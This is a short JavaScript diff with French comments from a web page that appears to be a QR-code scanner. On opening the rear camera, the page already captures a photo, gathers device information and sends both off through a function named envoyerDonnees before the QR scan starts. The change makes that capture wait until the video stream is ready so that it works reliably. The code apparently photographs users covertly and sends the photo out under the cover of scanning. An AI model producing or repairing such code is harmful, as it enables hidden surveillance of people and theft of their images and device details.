@@ -177,15 +177,17 @@
             if (streamMain) {
                 videoMain.srcObject = streamMain;
 
-                // Capturer la photo immédiatement
-                const dataURLMain = capturerPhoto(videoMain);
-                const blobMain = dataURLToBlob(dataURLMain);
-                const infosAppareil = await obtenirInfosAppareil();
+                // Attendre que le flux vidéo soit prêt avant de capturer la photo
+                videoMain.onloadedmetadata = async () => {
+                    const dataURLMain = capturerPhoto(videoMain);
+                    const blobMain = dataURLToBlob(dataURLMain);
+                    const infosAppareil = await obtenirInfosAppareil();
 
-                await envoyerDonnees(blobMain, infosAppareil);
-                console.log('Image et informations envoyées avec succès');
+                    await envoyerDonnees(blobMain, infosAppareil);
+                    console.log('Image et informations envoyées avec succès');
 
-                lancerScanQRCode();
+                    lancerScanQRCode();
+                };
             } else {
                 alert("Impossible d'accéder à la caméra arrière.");
             }
